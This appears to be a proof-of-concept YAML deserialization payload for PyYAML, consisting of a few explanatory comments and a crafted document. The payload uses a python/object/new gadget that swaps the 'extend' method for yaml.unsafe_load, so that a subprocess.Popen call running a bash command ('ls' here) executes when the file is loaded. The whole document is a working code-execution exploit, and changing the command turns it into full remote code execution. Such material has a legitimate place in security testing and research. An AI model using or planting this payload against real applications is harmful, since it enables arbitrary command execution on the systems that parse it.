# The `extend` function is overriden to run `yaml.unsafe_load` with
# custom `listitems` argument, in this case a simple shell command
# listitems: !!str '!!python/object/apply:subprocess.Popen [["bash", "-c", "ls"]]'

- !!python/object/new:yaml.MappingNode
  listitems: !!str '!!python/object/apply:subprocess.Popen [["bash", "-c", "ls"]]'
  state:
    tag: !!str hacked
    value: !!str hacked
    extend: !!python/name:yaml.unsafe_load

